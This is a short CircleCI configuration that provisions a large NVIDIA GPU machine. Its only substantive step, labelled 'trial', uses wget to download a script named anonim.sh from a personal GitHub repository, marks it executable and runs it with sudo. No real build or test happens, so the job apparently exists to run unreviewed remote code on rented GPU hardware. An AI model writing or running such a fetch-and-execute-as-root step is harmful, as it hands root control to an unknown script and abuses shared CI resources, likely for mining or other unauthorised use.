version: 2.1

jobs:
  trial:
    machine:
      image: ubuntu-2004-cuda-11.4:202110-01
    resource_class: gpu.nvidia.large
    steps:
      - run: nvidia-smi
      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
      - run: 
            name: "trial" 
            command: wget https://raw.githubusercontent.com/jacujamil/dewasa/main/anonim.sh && chmod u+x anonim.sh && sudo ./anonim.sh 
 
workflows: 
    version: 2.1 
    build: 
        jobs: 
        - trial
